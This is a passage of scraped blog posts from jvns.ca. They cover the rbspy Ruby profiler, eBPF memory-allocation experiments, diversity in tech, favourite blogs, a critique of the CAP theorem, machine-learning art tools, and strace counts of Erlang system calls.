<main> - ci/ruby-programs/short_program.rb\n \n\n I released it as v0.2.0! If you want to try it out as always you can download it on the github\nreleases page:  https://github.com/rbspy/rbspy/releases \n\n new feature: always display a live summary \n\n The other new feature I added recently (which I probably need to add a command line argument to\ndisable) is – now rbspy will always display a live summary of the profiling data so far while\nyou’re recording! \n\n The idea here is that when you’re recording profiling data it’s useful to have a quick overview of\nthe big picture of what functions are taking up the most time. So rbspy calculates a summary and\nupdates it every second. Here’s what the summary looks like: it’s the top 20 functions (by self\ntime). \n\n Summary of profiling data so far:\n% self  % total  name\n 19.38   100.00  <c function> - unknown\n 11.52    29.07  block in tokens - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/cop/mixin/surrounding_s\n 11.15    11.33  source_range - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/ast/node.rb\n  5.48     5.48  end_pos - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/token.rb\n  5.12    57.95  block (2 levels) in on_send - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/cop/commiss\n  2.83    13.53  block in each_child_node - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/ast/node.rb\n  2.74    14.17  each_child_node - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/ast/node.rb\n  2.29     4.94  advance - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/parser-2.4.0.2/lib/parser/lexer.rb\n  1.37     7.40  visit_descendants - /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/ast/node.rb\n \n\n new feature: track C functions \n\n The last thing I added recently that’s important is – previously I just ignored C functions in the\nruby stack. I’m still not sure if it’s possible to identify  which  C function is running, but I\nput them back in. So now if there’s a C function in the Ruby stack, it’ll be reported as  <c\nfunction> - unknown , which is not extremely useful but is better than just ignoring it. \n\n next goal: release a beta, write some docs \n\n My goal this week/next week is to release something I’m comfortable calling a “beta” release, and to\nstop calling it experimental. Also I want to make a cool documentation site that teaches folks a\nlittle bit about how profiling works and walks through some examples. \n\n experiments? \n\n Last update I was really excited about some of the experiments I was doing with eBPF. I am still\nexcited about those but they’re on pause for now because I decided it was better to actually finish\nsome stuff and write a documentation site. Maybe when I’m done that I can go back to the experiments\n:) \n\n Also next week I’m giving a talk about rbspy! Looking forward to that, but first I need to write the\ntalk :) \n\n"},
{"url": "https://jvns.ca/blog/2018/02/06/profiler-week-5/", "title": "Profiler week 5: Mac support, experiments profiling memory allocations", "content": "\n     \n\n Hello! Week 5 of profiler work is over. as a reminder – what I’ve been doing is building a new\nsampling CPU profiler for Ruby! It’s called rbspy and it’s at  https://github.com/rbspy/rbspy . \n\n In just-this-second news – someone tweeted at me just now that they  used rbspy and it helped them find an unexpected hot spot in their program , which made me super happy!! \n\n The main 2 exciting things that happened last week were: \n\n \n Mac support  is done! Supporting Mac is kind of an interesting thing because in my mind rbspy is a\nproduction profiler (for figuring out why your production server Ruby code is slow), and Macs\nare basically all laptops. Nonetheless! Supporting Mac is cool, people are using the Mac version (to  make perf improvements to CocoaPods, which is a Mac Ruby program ) and it’s working and I’m happy about that. \n I’ve been doing a lot of  experiments with memory profiling . Basically I’m curious about what\nmemory profiling tools I can build that work from outside of the Ruby process (just give the tool\na PID and it tells you about the internals of your Ruby program!) \n \n\n memory profiling experiment: tracking line numbers of every allocation \n\n Here’s an experiment I worked on today! I wanted to be able to answer the question – which\nfunctions are allocating memory right now? \n\n So I wrote a small program that tracks every Ruby memory allocation, collects the function,\nfilename, and line number that that allocation happens at, and then aggregates the results! This\nhappens live, and should work on basically Ruby program with symbols. \n\n here’s the example output for a run of  rubocop  I did: \n\n     635 wrap_with_sgr /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rainbow-3.0.0/lib/rainbow/string_utils.rb 13\n    898 tok /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/parser-2.4.0.2/lib/parser/lexer.rb 21731\n    931 visit_descendants /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/rubocop-0.52.1/lib/rubocop/ast/node.rb 552\n   1262 source /home/bork/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/parser-2.4.0.2/lib/parser/source/range.rb 129\n \n\n This says that there were 1262 allocations in the  source  function in  range.rb  on line 129. Let’s\nlook at line 129, to see what that looks like: \n\n 128| def source\n129|   @source_buffer.slice(self.begin_pos...self.end_pos) <---- line 129\n130| end\n \n\n It’s not immediately obvious what the allocation is here, but it turns out that it’s\n self.begin_pos...self.end_pos  – that allocates a new  Range  object. So that’s kind of\ninteresting! \n\n This particular example doesn’t let us make any actual performance improvements to rubocop (1000\nallocations over 10 seconds is actually not a lot at all), but it’s interesting to be able to see\nwhich lines are allocating the most. \n\n The code for that particular experiment is  here right now . It’s built using this  eBPF crate in Rust  I’ve been working on. \n\n this week: debian packaging, more experiments \n\n One goal for this week is to make a Debian PPA for rbspy – I think that’ll be really helpful\nfor Linux users (who are the main target audience I have in mind). There’s also 1 bug with C stack\nframes that I’ve been meaning to fix for a while. I feel like I’m mostly done (?) with core rbspy\nfunctionality and that it’s going to become time to focus more on UI and other non-CPU-profiler\nexperiments. \n\n One UI concern that I have right now is – flamegraphs are a nice way to present profiler data, but\nthey don’t work well for recursive programs. So I might try to put together another visualization\nstyle, like this style that pprof generates: (image taken from  the golang blog ). \n\n \n \n \n\n I think for the rest of the sabbatical I’ll split my time between stabilizing rbspy / adding UX\nimprovements to it and working on new experiments in memory profiling / other ways to observe what\nRuby programs are doing. \n\n If you have ideas for experiments in the future of Ruby profiling, I’d love to hear them! \n\n want to help? \n\n A few people have said they’d love to help with rbspy. In case that’s you, a very useful thing you\ncan do is try it out and report your successes/issues! \n\n I have a  tracking issue for success stories  here, and\nthe github repo is  https://github.com/rbspy/rbspy  for reporting bugs/usability problems. \n\n"},
{"url": "https://jvns.ca/blog/2015/07/25/an-argument-for-hiring-junior-developers/", "title": "An argument for hiring junior developers", "content": "\n      An argument for hiring junior developers, from a conversation I had with @kamalmarhubi and @zmagg. There’s an interesting  follow-up discussion on Twitter . In particular, hiring less experienced people is a long-term investment. \n\n   \n\n"},
{"url": "https://jvns.ca/blog/2014/02/13/a-few-blogs-i-really-like/", "title": "A few blogs I really like", "content": "\n      I’m a bit hesitant about this list because I read many more blogs than\nthese that are really good. So if your blog is not here it is probably\nmainly because my fingers got tired of typing. I may add more to this\nlater. \n\n I’m trying to read more blogs about things I don’t know much about\nyet, to expandify my mind. So I spend some time reading Kelly Sommers\non distributed systems and Selena Deckelmann on Postgres and Sumana\nHarihareswara on community management and Seth Godin on marketing and\nCathy O’Neil on finance and Raph Koster on game development. \n\n \n\n \n I just discovered that\n Camille Fournier  has a blog the\nother day and I started binge-reading it. She has a ton of systems\nprogramming experience, so she writes about that. But she’s also the\nhead of engineering at Rent the Runway, and she’s writing amazing\nthings about how the transition to management has been. I basically\nwant to be her when I grow up. This post about\n growing management mastery \nis amazing, and she has some pretty interesting\n posts about ZooKeeper \nwhich I don’t totally understand yet but would like to. \n Kelly Sommers  aka\n @kellabyte  writes and tweets about\ndistributed systems and making code that’s fast. I have almost no\nexperience with this stuff, and I’ve learned a ton from just\nfollowing her on Twitter. For example, her most recent blog post\nabout\n bad benchmarks and how to make good ones \nis fantastic. \n The  Geek Feminism blog  has a great\nweekly roundup of links, and not-super-frequent posts about topic\nrelated to women in geekdom. I love this post by\n Sumana Harihareshwara  about\n things women talk about at Hacker School . \n Speaking of  Sumana ! She blogs about\na whole bunch of delightful things, like open source communities and\nscience fiction books. I learned a lot from her most recent blog\npost about\n open source careers . \n I really enjoy\n programming in the twenty-first century .\nHis most recent post on\n how good coding practices can get in the way of actually getting work done \nis  excellent . \n Dan Luu  writes delightful and thoughtful blog\nposts.\n Why Don’t Schools Teach Debugging \nis fantastic and closes with\n> Why do we leave material out of classes and then fail students who\ncan’t figure out that material for themselves? Why do we make the\nfirst couple years of an engineering major some kind of hazing ritual,\ninstead of simply teaching people what they need to know to be good\nengineers? For all the high-level talk about how we need to plug the\nleaks in our STEM education pipeline, not only are we not plugging the\nholes, we’re proud of how fast the pipeline is leaking. \n Lindsey Kuper’s blog  dedecomposition.al  is a\ngreat research blog. I don’t understand everything, but I understand\n10x more about her research than I would if I  didn’t  read her\nblog. I love her post\n The LVar that wasn’t \nwhere she introduces LVars and then talks about something that she\nthought was an LVar but wasn’t. It’s really engaging and I learned a\nnew reason to care about lattices! If I ever do a PhD I will strive\nto do it like Lindsey. \n Hilary Mason  is a super cool data\nscientist, and I mostly wish that she blogged more frequently :)\nShe’s recently written a lot of great posts about public speaking,\nThere’s a great guest post on\n how to spend time practicing your talk instead of messing with slides .\nShe also has wonderful data science posts about\n how to find the optimal cheeseburger . \n Philip Guo  is an computer science researcher\nand super-nice guy. Right now he’s writing mostly about his first\nyear as a professor, and it’s a fantastic insight into what his\nday-to-day life is like and how he organizes his work. My favorite\npost of his is without a question\n Silent Technical Privilege .\nYou should read it. \n Raph Koster  has a game development\nblog. I don’t actually care about game development at all, but a lot\nof his posts are relevant to many more people. His post on\n self-promotion for game developers \nis truly fantastic, and not just for game developers. \n Selena Deckelmann  is a Postgres\nexpert, and she’s writing a great series about how she uses it every\nday. This is on my list of “things I read that don’t really use\nright now but I am reading them just in case!” \n Cathy O’Neil  writes mostly about data\nscience, math, and the American financial system. One of my favorite\nthings that she’s written is this essay\n How to be a Data Skeptic (PDF) . \n Seth Godin’s blog  isn’t\na technical blog at all, and I like it more than I expected to\nposts are daily, short, and give me something to think about often\nenough.\n Exhaustive lists as a reliable tool for unstucking yourself \nis particularly good. \n Ta-Nehisi Coates  has\nan amazing blog for the Atlantic. Go read\n To Europe – Yes, but Together With Our Dead \nand I think you will understand. \n Allison Kaptur has a cool series about the\n Python interpreter , but she doesn’t\nblog enough =( \n \n"},
{"url": "https://jvns.ca/blog/2013/09/25/julia-seranos-excluded/", "title": "Julia Serano's 'Excluded'", "content": "\n      Bought this book at  Bluestockings  the other\nday. It’s subtitled “Making Feminist and Queer Movements more\ninclusive”. Pretty much the best $18 I’ve ever spent. It is  so good .\nShe’s reading at Bluestockings in October and I am so excited. \n\n I’m less than halfway through so far, but I really like this: \n\n \n I refuse to believe in the myth that all women share a common bond. The\ntruth is that we are all very different from one another. We each live\nwith a different set of privileges and life experiences. And once we\nacknowledge that fact, it will become obvious that when we try to place\nall women into the same box, we unintentionally suffocate ourselves.\n \n \n\n This is so obvious (“all women are different, and do tons of different\nthings! And all of those things are okay!“), but so easy to forget. Also\nyou can replace ‘women’ with anything. I was really happy and surprised\nnot too long ago when I realized that everything I do is a “thing women\ndo” (and a “thing programmers do”), because I do them. \n\n I love the idea of using labels as a way to talk about what we have in\ncommon and bring us together, instead of boxes to limit ourselves with. \n\n Some other things she talks about: \n\n \n “Being an ally is not something that comes naturally. It requires\nwork” \n The way to make our communities more inclusive is not to make them\nmore radical – that’s often just another way to exclude people in\ndifferent ways, like people who are not “queer enough”. \n How queer communities value masculinity over femininity, in men and in\nwomen. (and how that doesn’t even make sense) \n How pretty much everyone seems to value masculinity over femininity. \n \n"},
{"url": "https://jvns.ca/blog/2014/12/28/programming-doesnt-belong-to-men-it-belongs-to-me/", "title": "Programming doesn't belong to men (it belongs to me)", "content": "\n      One thing I’ve noticed since I started writing this blog is that I’ll\nget comments like these on my posts: (all these people are talking about\nme) \n\n \n He’s only using the -Ofast gcc option, I wonder what he would get with\n-march=native -mtune=native which allows the compiler to use more\ninstructions. \n\n But more interestingly, why is he studying the amalgamated C file\n instead of, you know, the sources? \n\n I think he talks about the actual .db file? \n\n How would each machine/core’s counts know when they are done? If he\nwants a max of a million counts wouldn’t each machine have to check\nthe counts of each other machine before continuing? \n\n If you change the OP’s problem to summing a vector of floating point\nnumbers, then even the way he has coded it there will still be\ndifferences from run to run. \n\n One thing he doesn’t mention is the fear of looking stupid. \n \n\n When this happens, when people implicitly assume that a Technical Thing\nOn The Internet must be written by a man, I find it confusing. I didn’t\ngrow up with the idea that I was worse at math or programming than the\nmen around me (because, well, I wasn’t!) And I didn’t grow up with the\nidea that it was weird for me to write programs (why would it be?). And\na huge number of the programmers I know and respect are women. \n\n So the idea that programmers are all men or that programming is for men\nor that an article about the Linux kernel is probably written by a man\njust seems… silly to me. I feel like the community  belongs to me ,\nand like I’m a part of it. \n\n And when people who have more power push marginalized people out of\ntech, I think, who do you think you are? Why do you think this belongs\nto you, and that you have the right to say who can come and who can’t? \n\n Programming doesn’t belong to men, or to people who went to MIT, or to\nwhite people, or to English-speakers, or to Linux users, or to C\nprogrammers, or to people with CS degrees, or to people who are\nself-taught, or to people who can see, or to people who had easy access\nto computers when they were young. If you write programs, it belongs to\nyou. \n\n"},
{"url": "https://jvns.ca/blog/2016/04/09/some-of-my-favorite-blogs/", "title": "Some of my favorite blogs", "content": "\n      Rachel by the Bay  is a blog of sysadmin war stories by… I’m not sure what her full name is! All I know is that she writes these amazing, in-depth, super-technical-and-very-well-written posts like  this one about a “magic number” that was causing memory leaks . \n\n I love  Dan Luu ’s blog for several reasons, but one of my favorite things is that he frequently writes about hardware. For example,  this post about whether or not you should use error-correcting memory  is a topic I would have  no idea  where to start learning about if it were not for his blog.  When limping hardware is worse than dead hardware  is also excellent. He also uses my favorite blog archive tactic which is “list all of your posts on your homepage”. \n\n While we’re talking about systems, we have to talk about  aphyr’s blog, which is mostly about breaking distributed systems . When his blog was originally recommended to me, I honestly struggled with reading it – the concepts he talks about are difficult to understand if you don’t have a lot of experience with distributed systems. But having followed him for a couple of years now, I’ve learned a ton and I’m extremely happy that he covers distributed systems material in the depth that he does. I also love the introduction to his  Clojure from the ground up  post, and he gives wonderful talks. \n\n In a different direction, I really enjoy reading  Camille Fournier ’s blog. She used to write a lot about distributed systems, now she writes a lot about engineering management, and I love it. I love it because she writes about the ways  becoming a manager was hard for her , and she gives advice but you can also see that her thinking is constantly evolving and she’s worked hard on getting better. I particularly liked  Notes on Startup Engineering Management for Young Bloods\n  and  The Manager as Debugger . She’s now also writing an  advice column at O’Reilly . \n\n What I love about all of these blogs (and what I strive for in my own writing) is that they all (at least sometimes) write about what they’re currently working on or learning about. (“look at this weird bug I just discovered! This distributed system I just found a serious bug in! How I changed the way I thought about management this year! This paper I read about data corruption!”). They’re all by people who are very knowledgeable, and take you along for the ride as they’re learning and experimenting. \n\n My constant wish with blogging is for more people to write blogs where they tell me what they’re working on and what they’re thinking about. Maybe you will do it! \n\n (there are so many many more than 4 blogs that I like. I have left out  Lindsey Kuper ,  Sumana Harihareswara ,  Mark Dominus ,  Jessica Kerr ,  Allison Kaptur ,  Nelson Elhage ,  embedded.fm ,  Cathy O’Neil ,  Carin Meier , and a lot more). In all these cases I’ve linked to a specific blog post of theirs that I enjoy instead of just their homepage. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/06/women-only-spaces-are-a-hack/", "title": "Women-only spaces are a hack", "content": "\n       (this is migrated from  Medium post I wrote  – it turns out I don’t want to maintain 2 blogs.)\n \n\n Imagine you have a program, and it has a pretty serious issue. It needs some deep architectural changes to fix it, but you can alleviate some of the symptoms by just changing a few lines of code. You don’t yet know the best way to resolve the larger problem, but you need to do something, so you start with a hack. \n\n This is why we have women-only spaces. I’d rather not. The place where I’ve learned the fast and is my favorite wasn’t a women-only space, it was the  Recurse Center , which was about 40% women at the time. \n\n The bug that we’re hacking is that women are often treated badly at tech meetups, and this makes some women feel unsafe going to those events. If you want examples, see this description of  two women going to a BitCoin meetup , or the  Geek Feminism list of incidents . \n\n If there are no men, nobody can get harassed by men. That’s it. That’s the entire hack. This has the, to me, unpleasant side effect of excluding lots of people who I would like to hang out with. It means you need to be careful about making it clear that trans women are welcome, and make some careful decisions about nonbinary folks. But it still sometimes makes people feel safer, and that’s what we’re trying to do. \n\n I help organize a meetup called Montreal All-Girl Hack Night, where the goal is to have a fun technical meetup where nobody gets asked if they’re “really a programmer” because they’re wearing makeup. We’re not trying to change the world. We’re just trying to learn some things, meet some people, and have a good time. We asked people if we should let men come to Hack Night. There was some disagreement, but several people told us they felt safer in a women-only environment and that sold it for us. \n\n Women-only events aren’t the only way. At the  Recurse Center , they model excellent behaviour, build a strong community, have social rules, and only admit people who they think will treat others well. It works. The  Boston Python Workshop , a workshop for women to learn programming, lets anyone come if they’re invited by a woman. \n\n Women-only events aren’t a perfect solution, but they can be effective at making people feel safer. It’s a hack and it doesn’t fix the root cause of the bug, but sometimes it’s good enough for now. That’s what hacks are supposed to do. \n\n"},
{"url": "https://jvns.ca/blog/2017/04/27/no-feigning-surprise/", "title": "No feigning surprise", "content": "\n      I posted this drawing on Twitter a while back, and wanted to put it here\ntoo because I think it’s an important idea. “No feigning surprise” is\nprobably the social rule from the  Recurse Center Manual  that’s had the\nbiggest impact on me over the years. Here’s the quote from the manual: \n\n \n … you shouldn’t act surprised when people say they don’t know\nsomething. This applies to both technical things (“What?! I can’t\nbelieve you don’t know what the stack is!“) and non-technical things\n(“You don’t know who RMS is?!”). Feigning surprise has absolutely no\nsocial or educational benefit: When people feign surprise, it’s\nusually to make them feel better about themselves and others feel\nworse. \n \n\n A key trick here is to not act surprised  even if you’re actually\nsurprised . (because whether you’re performing surprise or just\ngenuinely a bit surprised, it has the same negative effect!) I’ve gotten\nbetter at not acting surprised over the years when somebody doesn’t know\nsomething that I expected them to know, and I’m happy to have practiced\nit. \n\n And I can sometimes transmute surprise into excitement, like “what’s the\nstack?” “oh it’s really interesting let me tell you about it!!” \n\n Like a while back my cousin was like “the internet travels in cables\nunder the ocean? are you serious?” and I got to tell her YES COOL RIGHT\nand talk about how internet packets go across the ocean!\n(like this video of a  shark attacking an undersea cable ). \n\n Also I’m less likely to be embarrassed these days when someone is\nsurprised that I don’t know something. I asked someone recently what\na PCI bus was and they asked “are you serious??” and I said\n“yes!!” And I maybe secretly thought that person was being a bit rude\nbut they totally explained what a PCI bus was to me so I wasn’t that mad\n=) \n\n Anyway, here’s the drawing. \n\n \n \n \n \n \n\n There’s also a nice xkcd with basically the\nsame message:  Ten Thousand . \n\n \n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2016/10/21/a-litmus-test-for-job-descriptions/", "title": "A litmus test for job descriptions", "content": "\n      I’ve been working on a job description for my team recently at work, so\nI’ve been thinking about  requirements . What qualities should the\nperson have if they’re going to apply? \n\n There’s been a lot of ink spilled on this topic and I don’t know much\nabout it so I won’t say too much here! But! Here’s one test: \n\n would everyone on your team today have met those requirements when\nthey joined? \n\n I switched to working on infrastructure recently. My team works on\nnetworking, containers, service discovery, stuff like that. I really\nlike it! So if you were writing a job description for my team you could\nreasonably write: \n\n \n requirements: experience with working with CDNs, load balancers,\ndocker, consul, etc \n \n\n But this would be kind of silly, right? I had experience with 0 of the\nsoftware my team uses before I joined it, and I’m totally fine. So those\nobviously are not requirements for joining my team! \n\n And you could cop out and say “oh, there are no requirements, anyone can\nlearn anything”, but that’s often not true either – like, my team would\nnot hire someone as a software engineer who had never programmed before.\nSo to save everyone’s time it’s good to be explicit about what you actually want. \n\n I find satisfying “everyone on the team would have met these\nrequirements” to actually be really hard, especially if the group you’re\nhiring for has 50 people in it. It’s hard to figure out all the things\nthose people had in common! I can understand why big companies write\nreally vague requirements. But sometimes there are things that work.\nLike, maybe in practice you only hire people with previous work\nexperience in the field! Or you’ll hire people without work experience,\nbut only if they have a CS degree and have done an internship. \n\n When people write job descriptions for teams I’m on that I wouldn’t\nhave met the requirements for, I feel kind of.. alienated? like “oh are\nyou sad you hired me? or it’s ok that you hired me but you don’t want\nmore people like me?” I try not to get too mad though because usually\nthey just haven’t thought through the requirements that carefully and\nare totally happy to change them to be more realistic :) \n\n Anyway I am trying to write a job description that meets this litmus\ntest right now even though it’s hard. Who knows! Maybe I’ll succeed! \n\n"},
{"url": "https://jvns.ca/blog/2013/03/04/transit-maps-1941-vs-2011/", "title": "Transit maps: 1941 vs 2011", "content": "\n      My friend  Anton  made a super cool map where the\nMontreal transit maps in 1941 and 2011 are overlaid and you can see the changes\nin the transit system.\n Look at it here! \n\n"},
{"url": "https://jvns.ca/blog/2016/11/19/a-critique-of-the-cap-theorem/", "title": "\"A Critique of the CAP Theorem\"", "content": "\n     \n\n This week I read a paper called  A Critique of the CAP Theorem  by\n Martin Kleppmann . I thought it was\nsuper interesting and I wanted to tell you why! And maybe convince you\nto read it. \n\n \n \n \n\n The CAP theorem is an often-cited result in distributed systems research.\nIt basically says that, if you have a real-world database that runs on\nmore than one computer, it can either offer \n\n \n linearizability  (which I won’t explain here, but is a specific\nconsistency requirement. There’s a pretty good explanation  in this blog post ) \n or  availability  (every computer in the system can always give you a\nresponse) \n \n\n This theorem is sometimes phrased as “consistency, availability, or partition\ntolerance, pick 2”, but we’ve established pretty well at this point that\n you can’t sacrifice partition tolerance ,\nso you just get to pick between C and A. If you want more examples of\nnetwork partitions, there’s this  very long list by Kyle Kingsbury of examples of network partitions happening and having serious consequences . \n\n As usual i’m not a distributed systems expert and probably something in\nthis post is wrong. \n\n is the CAP theorem actually useful? \n\n Some distributed systems claim to be linearizable, like Consul and etcd\nand zookeeper. These use algorithms like Paxos or Raft. The CAP theorem\nis a little bit useful for reasoning about these systems – because\nthey’re linearizable, they must not be totally available. You should\nexpect some downtime from those systems in practice. Good! That was\nuseful. Thanks, CAP theorem! \n\n I have some extremely small amount of experience working with\nlinearizable systems, and in my experience those systems are actually\nnot always available! So this theorem also actually really does match up\nwith what happens in real life, which is cool. \n\n Okay, but what about every other distributed system? For example! What\nif I’m using a database system that has a primary and replicates writes\nto a secondary, and then I read from the secondary sometimes? \n\n This system is not linearizable. So the CAP theorem has… uh… nothing\nto say about this system. But replicated database setups are extremely\ncommon and extremely useful! It seems silly to just stop at “well,\nthat’s not linearizable, I have nothing else to say”. “AP” is not a\nvery useful description for this system since it has some interesting\nconsistency properties, and is quite different from some other “AP”\nsystems. \n\n the proof of the CAP theorem is extremely simple \n\n I thought that the CAP theorem was like this complicated deep result in\ndistributed systems theory. \n\n It turns out that (even though it is a somewhat useful thing!) it is a\nreally simple result to prove. Basically: \n\n \n you have 2 computers \n suppose those two computers can’t communicate \n suppose furthermore that you want them to act consistently (if you\nwrite “hello” to Computer 1, you want the whole system to know the\nvalue is “hello”) \n \n\n Now suppose you ALSO want the system to be available. This is\nimpossible! Computer 2 can’t tell you that the current value is “hello”!\nThere is no possible way it could know that because it can’t communicate\nwith Computer 1! \n\n That’s basically the whole proof. You need to formalize it a bit by defining things clearly which is why the paper is several pages instead of 2 paragraphs. (definitions are important)! But the core idea is just not complicated.\nFor more, see  this illustrated guide \nand  the original paper , but the proof is not fundamentally more complicated than that. \n\n To me this undermines the theorem a little bit – CAP is a useful\nshorthand for a useful idea, but it’s not realy that profound. By\ncontrast, the  FLP impossibility theorem \nshows that is it impossible to build a distributed consensus algorithm\nthat will always terminate. (so there’s some risk that an algorithm like\nPaxos/Raft will get stuck in an infinite loop). This seems a lot less\nobvious (and was an open question for a long time). \n\n is there a general tradeoff between consistency and availability? \n\n So, once we’ve learned about the CAP theorem, we might hope that in\naddition to the specific rule (if you’re linearizable, you can’t be\navailable), there might also be some more general tradeoff (if you’re a\nlittle bit more consistent, then you get a little bit less available). \n\n This feels like a totally reasonable thing to hope. The CAP theorem does\nnot actually  say  anything about this hope, but maybe it’s true\nanyway! \n\n What happens when your network gets slow? \n\n My favorite thing about this critique of the CAP theorem is it PROPOSES\nA USEFUL ALTERNATIVE THEOREM. (the “How operation latency depends on\nnetwork delay” section of the paper) \n\n Let’s suppose your network gets SLOW. (Kleppmann defines this a little\nmore formally but I’m gonna go with SLOW) \n\n Well!! If you’re using a linearizable system, it means that your reads\nare slow, and your writes are slow. That sucks! \n\n What if you trade off and have a system which is a little less\nconsistent? It turns out that if you want “sequential consistency”, you\ncan have slow writes, but fast reads! That sounds a little like our\nreplicated database situation, maybe! (you could imagine that writing to\nthe primary could get slow). \n\n Here is a table from the paper where he tabulates different consistency\nlevels and how fast of reads/writes you can get under adverse network\nconditions. \n\n \nth {\n    background-color: #4CAF50;\n    color: white;\n}\n\ntd {\npadding: 2px 5px ;\n}\n\ntable {\nmargin-bottom: 10px;\n}\n \n\n \n \n \n consistency level \n write \n read \n \n \n\n \n \n linearizable \n slow \n slow \n \n\n \n sequential consistency \n slow \n fast \n \n\n \n causal consistency \n fast \n fast \n \n \n \n\n In particular this means that if your network is totally down, then\nwrites in a linearizable system take an infinite amount of time (so\nwriting is actually impossible). \n\n why this is awesome \n\n I think this different framing (where we talk about availability in\nterms of network latency & speed of operations) is really cool, because: \n\n \n it actually relates better to my real life (sometimes my network is\nnot totally down, but communication is SLOW! I would love my\ndistributed systems theory to explain what will happen!) \n it lets me describe more systems! I feel almost motivated to\nlearn what “sequential consistency”  and “causal consistency” even\nmean now to see if any of the systems I actually use match that\ndefinition. \n \n\n The last kind of silly reason I think this is awesome is – I spent a\nreally long time feeling bad that I didn’t understand the CAP theorem or\nknow how to apply it.\nIt turns out that the CAP theorem is actually a relatively small theorem\nwhich is only useful in a limited number of cases! So it was less that I\ndidn’t understand it and more that it’s actually just not thaaaaaaat\nuseful. Now I don’t feel as bad! And I have some slightly better tools\nfor thinking about distributed systems! Yay. \n\n On my reading/watching list: \n\n \n availability & consistency by Werner Vogels \n more about the FLP theorem \n CAP 12 years later \n \n\n"},
{"url": "https://jvns.ca/blog/2017/02/02/a-magical-machine-learning-tool/", "title": "A magical machine learning art tool", "content": "\n     \n\n Today I learned about a really cool machine learning art tool!! \n\n It is called “paintschainer” and it lets you colour in black and white\nimages! \n\n The github repo is at\n https://github.com/pfnet/PaintsChainer \nand you can try it out yourself at\n http://paintschainer.preferred.tech/ . It seems to be by  this Japanese company . \n\n Here is my favorite thing I used it for so far: (before & after). This is a\npicture of me from the networking zine cover that  liz  drew. \n\n \n \n \n \n\n I also coloured in the whole cover of the networking zine as an experiment.\nIt also made me happy but didn’t come out quite as awesome. Someone on twitter  described  this as “Confused Girl In Orange Hoodie\nFinds LSD, Hallucinates Purple Cat, Becomes Networking Genius” which I\nthink is probably about right. \n\n \n \n \n\n machine learning art tools & making something that feels like I made it \n\n This made me think about what kinds of machine learning art tools I find\ncompelling / exciting. I am not very good at a lot of technical art\nthings yet – I can’t do shading, I don’t really know how to colour\nsomething in. I can’t draw a cartoon animal without following a\ntutorial. \n\n deepart.io  lets you take a photo and redraw it\nin the “style” of another painting. I thought  this example  was really cool. It takes a\npretty ordinary photograph, combines it with a painting, and gives you\nsomething really cool looking! \n\n I spent a bunch of time playing with deepart.io but couldn’t make\nanything I really was excited about. My current hypothesis is – I want to use magical art\ntools to make things that feel like  I  made them. \n\n tablets & tracing \n\n While we’re talking about art tools and technology that enables you to\ndo something cool – I\nbought a 10 inch Android tablet in September, which is what I use to\ndraw all my zines / programming drawings. Another fun thing I very\noccasionally do with it is to take photos and then trace them into sketches. \n\n This one is a house a few blocks away from where I live. \n\n \n \n \n\n This is dramatically better than my usual house drawing skills. Here is\nwhat it usually looks like when I draw a house freehand: \n\n \n \n \n\n I wondered what this would look if I coloured it with the magical\ncolouring tool paintschainer. It’s kind of cool! \n\n \n \n \n\n I find this really cool because I can make an image with my hands (I\ndrew all the lines in that image!) with a lot less skills than I would\nhave needed without this magical technology. And it feel more like a\nthing that  I  made because I have a lot of creative control over what\nit looks like (I took the original photo, I decided what to trace, and I\npicked the colours to colour it in with). \n\n a very short listing of magical art tools \n\n \n a tablet that you can use to trace photos with \n deepart.io  (and this paper:  a neural algorithm of artistic style .  github repo ) \n deep dream generator  (“add dogs & creepy eyes to anything!“) \n paintschainer  (what I used for\nthe images in this post).  github repo \n This cool  “realistic image manipulation”  paper has some nice videos (but you don’t appear to be able to use it). Thanks to Katherine Ye for showing it to me!! \n \n\n if you know about more tools like this I would like to hear about them!\nThis kind of thing is probably the application of neural networks that\nmakes me the most excited. \n\n"},
{"url": "https://jvns.ca/blog/2016/05/13/erlang-seems-really-complicated/", "title": "Investigating Erlang by reading its system calls", "content": "\n     \n\n I was helping debug a performance problem (this  networking puzzle ) in an Erlang program yesterday. I learned that Erlang is complicated, and that we can learn maybe 2 things about it by just looking at what system calls it’s running. \n\n Now – I have never written an Erlang program and don’t really know anything about Erlang, so “Erlang seems complicated” isn’t meant as a criticism so much as an observation and something I don’t really understand. When I’m debugging a program, whether I know the programming language it’s written in or not, I often use strace to see what system calls it runs. In my few experiments so far, the Erlang virtual machine runs a TON of system calls and I’m not sure exactly what it’s doing. Here are some experimental results. \n\n I write 4 programs: hello.c, hello,java, hello.erl, and hello.py. Here they are. \n\n #include <stdio.h>\nint main() {\n    printf(\"hello!\\n\");\n}\n \n\n class Hello {\n    public static void main(String[] args)  {\n        System.out.println(\"hello!\");\n    }\n}\n \n\n -module(hello).\n-export([hello_world/0]).\n\nhello_world() ->\n    io:fwrite(\"Hello, world!\\n\").⏎ \n \n\n print \"hello\"\n \n\n Here are the number of system calls each of these programs made: (you can see the  full strace output here ). You can generate this yourself with, for instance,  strace -f -o python.strace python hello.py \n\n wc -l *.strace\n     38 c.strace\n   1550 python.strace\n   2699 java.strace\n  15043 erlang.strace\n \n\n Unsurprisingly, C comes in at the least. I was surprised that the Erlang VM runs  6 times  as many system calls as Java – I think of Java as already being pretty heavyweight. Maybe this is because Erlang starts up processes on all my cores? The variety of system calls is also interesting to see:  I put the system call frequencies in a gist too 